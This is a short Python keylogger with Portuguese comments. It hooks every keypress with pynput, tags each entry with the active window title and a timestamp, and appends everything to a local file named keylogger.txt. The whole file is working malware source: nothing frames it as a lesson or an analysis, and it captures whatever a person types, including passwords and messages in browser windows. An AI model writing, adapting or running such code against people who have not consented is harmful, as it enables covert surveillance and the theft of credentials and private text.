from pynput import keyboard ### Biblioteca para pegar as keys
from win32gui import GetWindowText, GetForegroundWindow ### Biblioteca para identificar a janela do browser utilizada
import datetime ### Registro de datab e hora

LAST_WINDOW = None


def tecla_pressionada(tecla):
    global LAST_WINDOW
    with open("keylogger.txt", "a") as file: ### Arquivo que vai salvar as teclas apertas
        window = GetWindowText(GetForegroundWindow())### pegando a pagina que esta sendo utilizada
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            file.write("\n #### {} - {}\n".format(window, datetime.datetime.now()))
        try:
            if tecla.vk >= 96 and tecla.vk <= 105: ### O vk estava sendo gerado nos numeros de 0-9 no teclado numerico superior sendo 96 = 0 e 105 = 9 então foi necessario subtrair os valores
                tecla = tecla.vk - 96
        except:
            pass

        tecla = str(tecla).replace("'", "")### transofmrando a tecla em str
        print(tecla)

        if len(tecla) > 1:
            tecla = " [{}] ".format(tecla) ### formato que vai separar as teclas

        file.write(tecla)### escrevendo a tecla pressioanda


with keyboard.Listener(on_press=tecla_pressionada) as listener:
    listener.join()
